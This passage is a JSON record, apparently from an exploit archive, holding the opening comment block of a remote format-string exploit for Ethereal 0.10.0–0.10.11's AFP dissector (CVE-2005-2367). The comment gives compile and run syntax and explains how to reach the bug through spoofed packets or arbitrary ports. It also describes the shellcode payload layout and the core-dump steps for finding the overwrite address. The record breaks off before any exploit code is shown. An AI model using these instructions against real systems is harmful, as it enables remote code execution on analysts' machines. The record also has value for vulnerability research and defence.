{
    "text": "ecve : CVE-2005-2367 ， title : Ethereal 10.x - AFP Protocol Dissector Remote Format String - Linux remote Exploit ， verified : Verified ， exploit_detail : / *  [ ethereal [ v0.10. *  ]  :  ( AFP ) remote format string exploit. ]  ，  * by : vade79/v9 v9 @ fakehalo.us ( fakehalo/realhalo )  ，  * compile :  ，  * gcc xethereal-afp-fmt.c -o xethereal-afp-fmt ，  * ethereal homepage/url :  ，  * syntax :  ，  * ./xethereal-afp-fmt [ -spSrPanc ] -h host ，  * vulnerable versions :  ，  * v0.10.0 to v0.10.11 ( v0.9. * and below not effected )  ，  * fix :  ，  * packet-afp.c : 1733 : -proto_item_set_text ( item , rep )  ;  ，  * packet-afp.c : 1733 : +proto_item_set_text ( item , \"%s\" , rep )  ;  ，  * Ethereal is used by network professionals around the world for ，  * troubleshooting , analysis , software and protocol development ,  ，  * and education. It has all of the standard features you would ，  * expect in a protocol analyzer , and several features not seen in ，  * any other product. Its open source license allows talented ，  * experts in the networking community to add enhancements. It runs ，  * on all popular computing platforms , including Unix , Linux , and ，  * Windows. ，  * ethereal ( v0.10.0 to v0.10.11 ) contains a remotely exploitable ，  * format string bug in its AFP dissector code ( packet-afp.c ) . ，  * the vulnerable function is located in packet-afp.c in the ，  * dissect_reply_afp_get_server_param (  ) function. this function ，  * uses the get_name (  ) function to pluck a string ( the \"volume\" )  ，  * from the packet and proceeds to pass it ( improperly ) to ，  * proto_item_set_text (  ) which uses formats. ，  * this exploit uses the DSI/afpovertcp ( 548 ) TCP port as a means of ，  * exploiting this. the port does NOT have to be open to exploit ，  * this as you can send spoofed packets or connect to a different ，  * port ( explained in the next paragraph ) to get the job done. ，  * ethereal may rely on the source port , if no dissector is found ，  * for the destination port , to decide what dissector to use on a ，  * packet. this means ANY destination port may be used , granted it ，  * has no destination port dissector. ( ie. port 80 won't work , but ，  * port 1234 will )  ，  * as for exploiting this , it is somewhat special. there is no ，  * user-supplied data ( that i found usable ) on the stack to form ，  * addresses out of , however there are many \"real\" addresses you ，  * can use that are already there. this means you can not ，  * use the half-number (  $ hn ) or multiple number (  $ n ) writing methods ,  ，  * and you must attempt to do it in one number (  $ n ) write. people ，  * say this isn't desired , however it worked fine for me when ，  * testing this exploit-as if i had a choice. ，  * the exploit string itself is formed as follows ( in heap )  :  ，  * <fmt string><align><addr jump x 16><nops x 64><shellcode> ，  * method 1 of using the exploit string ( general situations )  :  ，  * the format string overwrites a selected address in memory to ，  * point to the <nops> and then the <shellcode>. ，  * to find the address ( -r option ) to use for this method run :  ，  * ./xethereal-afp-fmt -h <host> -r 0x08765432 ，  * then on the box running ethereal , run this on the core file :  ，  * objdump -D -s core | grep \"90909090 90909090 90909090 90909090\"\\ ，  *  | head -1 | awk '{",
    "time": "2005-08-06"
}